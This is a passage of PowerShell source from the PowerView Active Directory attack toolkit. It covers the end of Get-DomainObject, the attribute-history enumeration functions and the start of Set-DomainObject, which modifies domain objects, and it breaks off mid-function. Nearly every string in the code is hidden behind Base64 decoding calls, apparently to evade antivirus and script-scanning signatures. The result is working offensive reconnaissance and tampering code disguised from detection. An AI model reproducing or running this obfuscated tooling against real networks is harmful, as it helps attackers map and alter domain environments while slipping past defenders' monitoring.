        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($ObjectSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
                if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0=")))) {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSk=")))
                }
                elseif ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XihDTnxPVXxEQyk9")))) {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
                    if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
                        
                        
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2U=")))
                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $ObjectSearcher) {
                            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4=")))
                        }
                    }
                }
                elseif ($IdentityInstance -imatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JA==")))) {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))) + $_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WDI=")))) }) -join ''
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
                }
                elseif ($IdentityInstance.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA==")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ==")))) | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $ObjectDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw==")))))
                        $ObjectName = $IdentityInstance.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1]
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNhbUFjY291bnROYW1lPSRPYmplY3ROYW1lKQ==")))
                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ObjectDomain
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RdIEV4dHJhY3RlZCBkb21haW4gJyRPYmplY3REb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNl")))
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                elseif ($IdentityInstance.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg=="))))) {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKGRuc2hvc3RuYW1lPSRJZGVudGl0eUluc3RhbmNlKSk=")))
                }
                else {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKGRpc3BsYXluYW1lPSRJZGVudGl0eUluc3RhbmNlKSk=")))
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
            }

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RdIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVy")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
            }

            
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9UXy4q")))) {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PSRVQUNWYWx1ZSkp")))
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0kVUFDVmFsdWUp")))
                }
            }

            if ($Filter -and $Filter -ne '') {
                $ObjectSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYkRmlsdGVyKQ==")))
            }
            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RdIEdldC1Eb21haW5PYmplY3QgZmlsdGVyIHN0cmluZzogezB9"))) -f $($ObjectSearcher.filter))

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $ObjectSearcher.FindOne() }
            else { $Results = $ObjectSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
                    
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkFET2JqZWN0LlJhdw=="))))
                }
                else {
                    $Object = Convert-LDAPProperty -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkFET2JqZWN0"))))
                }
                $Object
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6IHswfQ=="))) -f $_)
                }
            }
            $ObjectSearcher.dispose()
        }
    }
}


function Get-DomainObjectAttributeHistory {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkcy1yZXBsYXR0cmlidXRlbWV0YWRhdGE="))),'distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))] = $FindOne }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) {
            $PropertyFilter = $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] -Join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("fA==")))
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU=")))][0]
            ForEach($XMLNode in $_.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkcy1yZXBsYXR0cmlidXRlbWV0YWRhdGE=")))]) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RFNfUkVQTF9BVFRSX01FVEFfREFUQQ=="))) -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $ObjectDN
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXR0cmlidXRlTmFtZQ=="))) $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdE9yaWdpbmF0aW5nQ2hhbmdl"))) $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VmVyc2lvbg=="))) $TempObject.dwVersion
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdE9yaWdpbmF0aW5nRHNhRE4="))) $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkFET2JqZWN0QXR0cmlidXRlSGlzdG9yeQ=="))))
                        $Output
                    }
                }
                else {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RBdHRyaWJ1dGVIaXN0b3J5XSBFcnJvciByZXRyaWV2aW5nICdtc2RzLXJlcGxhdHRyaWJ1dGVtZXRhZGF0YScgZm9yICckT2JqZWN0RE4=")))
                }
            }
        }
    }
}


function Get-DomainObjectLinkedAttributeHistory {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkcy1yZXBsdmFsdWVtZXRhZGF0YQ=="))),'distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) {
            $PropertyFilter = $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] -Join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("fA==")))
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU=")))][0]
            ForEach($XMLNode in $_.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkcy1yZXBsdmFsdWVtZXRhZGF0YQ==")))]) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RFNfUkVQTF9WQUxVRV9NRVRBX0RBVEE="))) -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $ObjectDN
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXR0cmlidXRlTmFtZQ=="))) $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXR0cmlidXRlVmFsdWU="))) $TempObject.pszObjectDn
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGltZUNyZWF0ZWQ="))) $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGltZURlbGV0ZWQ="))) $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdE9yaWdpbmF0aW5nQ2hhbmdl"))) $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VmVyc2lvbg=="))) $TempObject.dwVersion
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdE9yaWdpbmF0aW5nRHNhRE4="))) $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkFET2JqZWN0TGlua2VkQXR0cmlidXRlSGlzdG9yeQ=="))))
                        $Output
                    }
                }
                else {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RMaW5rZWRBdHRyaWJ1dGVIaXN0b3J5XSBFcnJvciByZXRyaWV2aW5nICdtc2RzLXJlcGx2YWx1ZW1ldGFkYXRhJyBmb3IgJyRPYmplY3RETg==")))
                }
            }
        }
    }
}


function Set-DomainObject {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{'Raw' = $True}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
